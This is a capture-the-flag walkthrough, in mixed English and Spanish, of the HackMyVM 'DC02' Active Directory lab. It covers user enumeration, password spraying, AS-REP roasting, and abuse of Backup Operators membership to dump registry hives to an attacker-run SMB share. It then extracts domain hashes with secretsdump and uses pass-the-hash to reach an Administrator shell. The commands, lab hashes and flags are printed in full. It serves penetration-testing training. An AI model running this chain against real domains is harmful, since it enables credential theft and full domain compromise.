# üñ•Ô∏è Writeup - DC02 

**Platform:** HackMyVM  
**Difficulty:** Medium  
**Operating System:** Windows  

# INSTALLATION

We download the `zip` containing the `.ova` of the DC02 machine, extract it, and import it into VirtualBox.

We configure the network interface of the DC02 machine and run it alongside the attacker machine.

# HOST DISCOVERY

At this point, we still don‚Äôt know which `IP` address is assigned to DC02, so we discover it as follows:

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```
Info:
```
Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.4.1        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.3        08:00:27:a0:a6:e6      1      60  PCS Systemtechnik GmbH      
 10.0.4.18       08:00:27:8e:e4:bf      1      60  PCS Systemtechnik GmbH
 ```

 We identify with high confidence that the victim‚Äôs IP is `10.0.4.18`.

 # PORT SCANNING

Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.18
``` 

```bash
nmap -n -Pn -sCV -p22,80,3306 --min-rate 5000 10.0.4.18
```
Info:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-07 18:22 CEST
Nmap scan report for 10.0.4.18
Host is up (0.00017s latency).
Not shown: 65518 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-08 01:22:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49719/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:8E:E4:BF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.24 seconds
```

It is clear that we are dealing with an `Active Directory` environment, and the domain is `SOUPEDECODE.LOCAL`.

We then add the domain to the `/etc/hosts` file.

Info:
```
127.0.0.1	localhost
127.0.1.1	kali
10.0.4.18       SOUPEDECODE.LOCAL
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

# SMB
Now we proceed with SMB enumeration to look for information about available shares and users:

```bash
smbclient -L SOUPEDECODE.LOCAL -N
```

Info:
```
session setup failed: NT_STATUS_ACCESS_DENIED
```

No podemos enumerar shares a traves de una NULL session.
Vamos a provar si esta habilitado el usuario guest.

```bash
netexec smb SOUPEDECODE.LOCAL -u 'guest' -p ''
``` 
Info:
```
SMB         10.0.4.18       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.0.4.18       445    DC01             [-] SOUPEDECODE.LOCAL\guest: STATUS_ACCOUNT_DISABLED
```

Vemos que la cuenta guest esta deshabilitada, asi que no tenemos forma de enumerar los recursos de SMB.

Hay que encontrar otra via para enumerar usuarios.

# KERBRUTE

Vamos a utilizar kerbrute para identificar usuarios del sistema con una wordlist de usernames.

```bash
./kerbrute_linux_amd64 userenum -d SOUPEDECODE.LOCAL  --dc 10.0.4.18 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Info:
```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/07/25 - Ronnie Flathers @ropnop

2025/09/07 18:43:51 >  Using KDC(s):
2025/09/07 18:43:51 >  	10.0.4.18:88

2025/09/07 18:43:51 >  [+] VALID USERNAME:	 admin@SOUPEDECODE.LOCAL
2025/09/07 18:43:51 >  [+] VALID USERNAME:	 charlie@SOUPEDECODE.LOCAL
2025/09/07 18:43:51 >  [+] VALID USERNAME:	 Charlie@SOUPEDECODE.LOCAL
2025/09/07 18:43:51 >  [+] VALID USERNAME:	 administrator@SOUPEDECODE.LOCAL
2025/09/07 18:43:51 >  [+] VALID USERNAME:	 Admin@SOUPEDECODE.LOCAL
2025/09/07 18:43:52 >  [+] VALID USERNAME:	 Administrator@SOUPEDECODE.LOCAL
2025/09/07 18:43:52 >  [+] VALID USERNAME:	 CHARLIE@SOUPEDECODE.LOCAL
2025/09/07 18:43:56 >  [+] VALID USERNAME:	 ADMIN@SOUPEDECODE.LOCAL
2025/09/07 18:44:46 >  [+] VALID USERNAME:	 wreed11@SOUPEDECODE.LOCAL
```

Encontramos dos usuarios que no son por defecto: charlie y wreed11.

Los ponemos en un archivo .txt para poder hacer password spraying con los usuarios

# PASSWORD SPRAYING

```bash
crackmapexec smb 10.0.4.18 -u users.txt -p users.txt --continue-on-success --no-bruteforce
```

Info:
```
SMB         10.0.4.18       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.4.18       445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie 
SMB         10.0.4.18       445    DC01             [-] SOUPEDECODE.LOCAL\wreed11:wreed11 STATUS_LOGON_FAILURE
```

Hemos obtenido la contrase√±a para el usuario charlie : charlie .

# SMB with user charlie

```bash
netexec smb 10.0.4.18 -u 'charlie' -p 'charlie'  --shares
```
Info:
```
SMB         10.0.4.18       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.0.4.18       445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie 
SMB         10.0.4.18       445    DC01             [*] Enumerated shares
SMB         10.0.4.18       445    DC01             Share           Permissions     Remark
SMB         10.0.4.18       445    DC01             -----           -----------     ------
SMB         10.0.4.18       445    DC01             ADMIN$                          Remote Admin
SMB         10.0.4.18       445    DC01             C$                              Default share
SMB         10.0.4.18       445    DC01             IPC$            READ            Remote IPC
SMB         10.0.4.18       445    DC01             NETLOGON        READ            Logon server share 
SMB         10.0.4.18       445    DC01             SYSVOL          READ            Logon server share
```

Nada interesante en los recursos de SMB

# Impacket lookupsid
Ahora que contamos con un usuario y contrase√±a validos vamos a sacar todos los usuarios del sistema utilizando la herramienta de impacket lookupsid.py.

```bash
impacket-lookupsid SOUPEDECODE.LOCAL/charlie@10.0.4.18 > user.txt
```

Info:
```
[*] Brute forcing SIDs at 10.0.4.18
[*] StringBinding ncacn_np:10.0.4.18[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164
498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SOUPEDECODE\Administrator (SidTypeUser)
501: SOUPEDECODE\Guest (SidTypeUser)
502: SOUPEDECODE\krbtgt (SidTypeUser)
512: SOUPEDECODE\Domain Admins (SidTypeGroup)
513: SOUPEDECODE\Domain Users (SidTypeGroup)
514: SOUPEDECODE\Domain Guests (SidTypeGroup)
515: SOUPEDECODE\Domain Computers (SidTypeGroup)
516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
517: SOUPEDECODE\Cert Publishers (SidTypeAlias)
518: SOUPEDECODE\Schema Admins (SidTypeGroup)
519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)
520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)
521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)
522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)
525: SOUPEDECODE\Protected Users (SidTypeGroup)
526: SOUPEDECODE\Key Admins (SidTypeGroup)
527: SOUPEDECODE\Enterprise Key Admins (SidTypeGroup)
553: SOUPEDECODE\RAS and IAS Servers (SidTypeAlias)
571: SOUPEDECODE\Allowed RODC Password Replication Group (SidTypeAlias)
572: SOUPEDECODE\Denied RODC Password Replication Group (SidTypeAlias)
1000: SOUPEDECODE\DC01$ (SidTypeUser)
1101: SOUPEDECODE\DnsAdmins (SidTypeAlias)
1102: SOUPEDECODE\DnsUpdateProxy (SidTypeGroup)
1103: SOUPEDECODE\bmark0 (SidTypeUser)
1104: SOUPEDECODE\otara1 (SidTypeUser)
1105: SOUPEDECODE\kleo2 (SidTypeUser)
1106: SOUPEDECODE\eyara3 (SidTypeUser)
1107: SOUPEDECODE\pquinn4 (SidTypeUser)
1108: SOUPEDECODE\jharper5 (SidTypeUser)
1109: SOUPEDECODE\bxenia6 (SidTypeUser)
1110: SOUPEDECODE\gmona7 (SidTypeUser)
1111: SOUPEDECODE\oaaron8 (SidTypeUser)
1112: SOUPEDECODE\pleo9 (SidTypeUser)
1113: SOUPEDECODE\evictor10 (SidTypeUser)
1114: SOUPEDECODE\wreed11 (SidTypeUser)
1115: SOUPEDECODE\bgavin12 (SidTypeUser)
1116: SOUPEDECODE\ndelia13 (SidTypeUser)
1117: SOUPEDECODE\akevin14 (SidTypeUser)
1118: SOUPEDECODE\kxenia15 (SidTypeUser)
1119: SOUPEDECODE\ycody16 (SidTypeUser)
1120: SOUPEDECODE\qnora17 (SidTypeUser)
1121: SOUPEDECODE\dyvonne18 (SidTypeUser)
1122: SOUPEDECODE\qxenia19 (SidTypeUser)
1123: SOUPEDECODE\rreed20 (SidTypeUser)
1124: SOUPEDECODE\icody21 (SidTypeUser)
1125: SOUPEDECODE\ftom22 (SidTypeUser)
1126: SOUPEDECODE\ijake23 (SidTypeUser)
1127: SOUPEDECODE\rpenny24 (SidTypeUser)
1128: SOUPEDECODE\jiris25 (SidTypeUser)
1129: SOUPEDECODE\colivia26 (SidTypeUser)
1130: SOUPEDECODE\pyvonne27 (SidTypeUser)
1131: SOUPEDECODE\zfrank28 (SidTypeUser)
1132: SOUPEDECODE\ybob317 (SidTypeUser)
1133: SOUPEDECODE\file_svc (SidTypeUser)
1134: SOUPEDECODE\charlie (SidTypeUser)
1135: SOUPEDECODE\qethan32 (SidTypeUser)
..................<REST_OF_USERS>.........................................
```

The list must be processed to extract only the usernames.

```bash
grep '(SidTypeUser)' user.txt | awk -F'\\\\' '{print $2}' | cut -d' ' -f1 > users.txt
```
Info:
```
Administrator
Guest
krbtgt
DC01$
bmark0
otara1
kleo2
eyara3
pquinn4
jharper5
bxenia6
gmona7
oaaron8
pleo9
evictor10
wreed11
bgavin12
ndelia13
akevin14
kxenia15
ycody16
qnora17
dyvonne18
qxenia19
rreed20
icody21
ftom22
ijake23
rpenny24
jiris25
colivia26
pyvonne27
zfrank28
ybob317
file_svc
charlie
qethan32
..................<REST_OF_USERS>.........................................
```

Hacemos otra vez un password spraying attack esta vez con la lista completa de usuarios del sistema a ver si podemos conseguir alguna contrase√±a aparte de la de charlie.

Pero no dio ningun resultado, solo disponemos del usuario charlie.

Por lo tanto, vamos a seguir buscando vias de ataque.

# AS REP ROAST ATTACK

Vamos a buscar usuarios que no requieran de pre autenticacion.

```bash
impacket-GetNPUsers SOUPEDECODE.LOCAL/ -no-pass -usersfile users.txt
```

Info:
```
..................<REST_OF_USERS>.........................................
[-] User caiden36 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User xbella37 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User smark38 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:29e708614452e851d9d95cf8cd8108f7$331de3dd589e0301b90d4f8d2f1c3a2ed03ecc6c5fce197018923441eac870373beb7619c90c2842e25901f6b4956c60d83f264840debc174e3bcbbc6a2409debd468578793b98855b005b69957b74d9810c642b893eb7b55d3bcd953434bce73a2ba6baaea7f667f172fecd4cdc3d5c22532b73cc1aae71013cd55c3987587ee66e336d23f1669137a33a7defa1ee7e3483c2f5b0f3e3485f0fad41f79966963804ec726fd526e9a32f332f8cbdd3feffb2ba1b9262cdd145e90f31835c4685f64beba5df1e41e28b4a74bf2648ad2813dd2caa210bd09ed0406403472616e9fe1eb17231f0388dfe46549d0b11462ea4dd798f65d8
[-] User fmike40 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User yeli41 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User knina42 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User vhelen43 doesn't have UF_DONT_REQUIRE_PREAUTH set
..................<REST_OF_USERS>.........................................
```
Hemos obtenido el hash del usuario zximena448 gracias a que no necessita pre autenticacion.

# HASH CRACKING

Vamos a poner el hash en un archivo hash.txt y crackearlo.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt
```

Info:
```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
internet         ($krb5asrep$23$zximena448@SOUPEDECODE.LOCAL)     
1g 0:00:00:00 DONE (2025-09-07 19:18) 100.0g/s 51200p/s 51200c/s 51200C/s 123456..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

La contrase√±a del usuario zximena448 es internet.

# SMB with user zximena448

```bash
netexec smb SOUPEDECODE.LOCAL -u 'zximena448' -p 'internet' --shares
```

Info:
```
SMB         10.0.4.18       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.0.4.18       445    DC01             [+] SOUPEDECODE.LOCAL\zximena448:internet 
SMB         10.0.4.18       445    DC01             [*] Enumerated shares
SMB         10.0.4.18       445    DC01             Share           Permissions     Remark
SMB         10.0.4.18       445    DC01             -----           -----------     ------
SMB         10.0.4.18       445    DC01             ADMIN$          READ            Remote Admin
SMB         10.0.4.18       445    DC01             C$              READ,WRITE      Default share
SMB         10.0.4.18       445    DC01             IPC$            READ            Remote IPC
SMB         10.0.4.18       445    DC01             NETLOGON        READ            Logon server share 
SMB         10.0.4.18       445    DC01             SYSVOL          READ            Logon server share
```

```bash
smbclient //SOUPEDECODE.LOCAL/C$ -U zximena448
```

Entrando al recurso C$ con el usuario zximena448 encontramos la flag de usuario.

```
2fe79eb0e02ecd4dd2833cfcbbdb504c
```

# PRIVILEGE ESCALATION

Como no tenemos acceso inicial por winrm ni otro medio, vamos a sacar informacion sobre las capacidades del usuario zximena448 a traves de LDAP.

Vamos a ver a que grupos pertenece

```bash
ldapsearch -x -H ldap://10.0.4.18/ -D "zximena448@SOUPEDECODE.LOCAL" -w 'internet' -b "dc=SOUPEDECODE,dc=LOCAL" "(sAMAccountName=zximena448)" memberOf
```

Info:
```
# extended LDIF
#
# LDAPv3
# base <dc=SOUPEDECODE,dc=LOCAL> with scope subtree
# filter: (sAMAccountName=zximena448)
# requesting: memberOf 
#

# Zach Ximena, Users, SOUPEDECODE.LOCAL
dn: CN=Zach Ximena,CN=Users,DC=SOUPEDECODE,DC=LOCAL
memberOf: CN=Backup Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL

# search reference
ref: ldap://ForestDnsZones.SOUPEDECODE.LOCAL/DC=ForestDnsZones,DC=SOUPEDECODE,
 DC=LOCAL

# search reference
ref: ldap://DomainDnsZones.SOUPEDECODE.LOCAL/DC=DomainDnsZones,DC=SOUPEDECODE,
 DC=LOCAL

# search reference
ref: ldap://SOUPEDECODE.LOCAL/CN=Configuration,DC=SOUPEDECODE,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

La linia que nos interesa es esta:

```
# Zach Ximena, Users, SOUPEDECODE.LOCAL
dn: CN=Zach Ximena,CN=Users,DC=SOUPEDECODE,DC=LOCAL
memberOf: CN=Backup Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL
``` 

Vemos que pertenecemos al grupo Backup Operators por lo que podremos aprovechar esto para poder obtener informacion utilizando un exploit de github:

Nos clonamos el repositorio a nuestra maquina atacante:

```bash
git clone https://github.com/horizon3ai/backup_dc_registry.git
```
Entramos en el directorio creado y alli tenemos el script reg.py , que es el exploit que usaremos para obtener informacion.

Pero antes por lo que vemos en las instrucciones tenemos que abrir un servidor SMB desde el host para que podamos obtener la informacion que le estamos pidiendo al DC:

```bash
mkdir smbshare
```
```bash
impacket-smbserver -smb2support 'share' ./smbshare
```

Info:
```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
La share esta activa y ahora ya podemos ejecutar el script

```bash
python3 reg.py zximena448:'internet'@10.0.4.18 backup -p '\\10.0.4.12\share'
```

Info:
```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Dumping SAM hive to \\10.0.4.12\share\SAM
Dumping SYSTEM hive to \\10.0.4.12\share\SYSTEM
Dumping SECURITY hive to \\10.0.4.12\share\SECURITY
```
Vamos a comprobar que haya funcionado
```bash
ls -la smbshare
```

Info:
```
total 11324
drwxrwxr-x 2 trihack trihack     4096 Sep  7 19:42 .
drwxrwxr-x 4 trihack trihack     4096 Sep  7 19:39 ..
-rwxrwxr-x 1 trihack trihack    28672 Sep  7 19:42 SAM
-rwxrwxr-x 1 trihack trihack    32768 Sep  7 19:42 SECURITY
-rwxrwxr-x 1 trihack trihack 11526144 Sep  7 19:42 SYSTEM
```
La informacion ha sido dumpeada en la share que hemos creado, por lo que vamos a extraer los hashes de dicho archivo utilizando la herramienta impacket secretsdump.py.

```bash
impacket-secretsdump -system SYSTEM -security SECURITY -sam SAM LOCAL
```

Info:
```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x0c7ad5e1334e081c4dfecd5d77cc2fc6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:6370e8f7f3d65aadf5d52c02e4f3dbd92c44e3eadea2d7d9c27c718ce527538dc41e5b967c76ba8749f8ff302884abef0c3e1d6aa937965dbe69f02a5fb3dc8cc21997701834dd231c740007ed8c18049206ffb74a364e18be18b57c538ce808b8fc31183887aa10a5b9c1e272dd34023102f397895354fd04c704338889041b2e1040d1a2ee9c085fc63eb97ad7b8e2da5b91db13d0415f8af70970832bece87319300e35c99b02e3677eca9836a8dd5c7db522ce1092ec3533f2917a3b7e7287eedec6d422aff78121bd0f00b39126e914196bfdf9edd61390f9a6b6be114472c0551b345ac505152af04734654dc3
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b9dd4c7c72ad5d5dacbff4590a8426cc
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4
dpapi_userkey:0x4813ee82e68a3bf9fec7813e867b42628ccd9503
[*] NL$KM 
 0000   44 C5 ED CE F5 0E BF 0C  15 63 8B 8D 2F A3 06 8F   D........c../...
 0010   62 4D CA D9 55 20 44 41  75 55 3E 85 82 06 21 14   bM..U DAuU>...!.
 0020   8E FA A1 77 0A 9C 0D A4  9A 96 44 7C FC 89 63 91   ...w......D|..c.
 0030   69 02 53 95 1F ED 0E 77  B5 24 17 BE 6E 80 A9 91   i.S....w.$..n...
NL$KM:44c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991
[*] Cleaning up...
```

Como podemos ver hemos obtenido los hashes de las contrase√±as de los usuarios pero de forma local, lo que queremos son las contrase√±as de los mismos usuarios pero del dominio, el hash que nos interesa es el del Domain Controller, y la que parece que podria ser es la de $MACHINE.ACC.

Vamos a hacer password spraying con el hash de machine.acc y los usuarios del dominio que ya tenemos en un archivo users.txt.

```bash
crackmapexec smb 10.0.4.18 -u users.txt -H 'b9dd4c7c72ad5d5dacbff4590a8426cc' --continue-on-success --no-bruteforce`
```

Info:
```
SMB         10.0.4.18       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.4.18       445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:b9dd4c7c72ad5d5dacbff4590a8426cc STATUS_LOGON_FAILURE 
SMB         10.0.4.18       445    DC01             [-] SOUPEDECODE.LOCAL\Guest:b9dd4c7c72ad5d5dacbff4590a8426cc STATUS_LOGON_FAILURE 
SMB         10.0.4.18       445    DC01             [-] SOUPEDECODE.LOCAL\krbtgt:b9dd4c7c72ad5d5dacbff4590a8426cc STATUS_LOGON_FAILURE 
SMB         10.0.4.18       445    DC01             [+] SOUPEDECODE.LOCAL\DC01$:b9dd4c7c72ad5d5dacbff4590a8426cc 
SMB         10.0.4.18       445    DC01             [-] SOUPEDECODE.LOCAL\bmark0:b9dd4c7c72ad5d5dacbff4590a8426cc STATUS_LOGON_FAILURE 
SMB         10.0.4.18       445    DC01             [-] SOUPEDECODE.LOCAL\otara1:b9dd4c7c72ad5d5dacbff4590a8426cc STATUS_LOGON_FAILURE 
SMB         10.0.4.18       445    DC01             [-] SOUPEDECODE.LOCAL\kleo2:b9dd4c7c72ad5d5dacbff4590a8426cc STATUS_LOGON_FAILURE 
SMB         10.0.4.18       445    DC01             [-] SOUPEDECODE.LOCAL\eyara3:b9dd4c7c72ad5d5dacbff4590a8426cc STATUS_LOGON_FAILURE
..................<REST_OF_USERS>.........................................
```
El hash coincide con el de la contrase√±a de DC01$

Ahora con este hash podemos utilizar otra vez la herramienta impacket secretsdump.py para dumpear los hashes, pero esta vez los hashes del dominio.

```bash
impacket-secretsdump 'SOUPEDECODE.LOCAL/DC01$@10.0.4.18' -hashes 'aad3b435b51404eeaad3b435b51404ee:b9dd4c7c72ad5d5dacbff4590a8426cc'
```

Info:
```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
soupedecode.local\bmark0:1103:aad3b435b51404eeaad3b435b51404ee:d72c66e955a6dc0fe5e76d205a630b15:::
soupedecode.local\otara1:1104:aad3b435b51404eeaad3b435b51404ee:ee98f16e3d56881411fbd2a67a5494c6:::
soupedecode.local\kleo2:1105:aad3b435b51404eeaad3b435b51404ee:bda63615bc51724865a0cd0b4fd9ec14:::
soupedecode.local\eyara3:1106:aad3b435b51404eeaad3b435b51404ee:68e34c259878fd6a31c85cbea32ac671:::
soupedecode.local\pquinn4:1107:aad3b435b51404eeaad3b435b51404ee:92cdedd79a2fe7cbc8c55826b0ff2d54:::
soupedecode.local\jharper5:1108:aad3b435b51404eeaad3b435b51404ee:800f9c9d3e4654d9bd590fc4296adf01:::
..................<REST_OF_USERS>.........................................
```

Hemos conseguido dumpear los hashes de dominio de todos los usuarios del sistema, incluido el usuario Administrador

Comprobamos que con el hash podemos acceder por winrm como administrador

```bash
crackmapexec winrm 10.0.4.18 -u Administrator -H '8982babd4da89d33210779a6c5b078bd' 
```

Info:
```
SMB         10.0.4.18       5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:SOUPEDECODE.LOCAL)
HTTP        10.0.4.18       5985   DC01             [*] http://10.0.4.18:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.0.4.18       5985   DC01             [+] SOUPEDECODE.LOCAL\Administrator:8982babd4da89d33210779a6c5b078bd (Pwn3d!)
```

Efectivamente podemos asi que solo queda entrar.

```bash
evil-winrm -i SOUPEDECODE.LOCAL -u 'Administrator' -H '8982babd4da89d33210779a6c5b078bd'
```

Info:
```
vil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
soupedecode\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
``` 

Ya tenemos acceso como administrador!

Dentro de la carpeta Desktop encontramos la flag de root:

```
d41d8cd98f00b204e9800998ecf8427e
```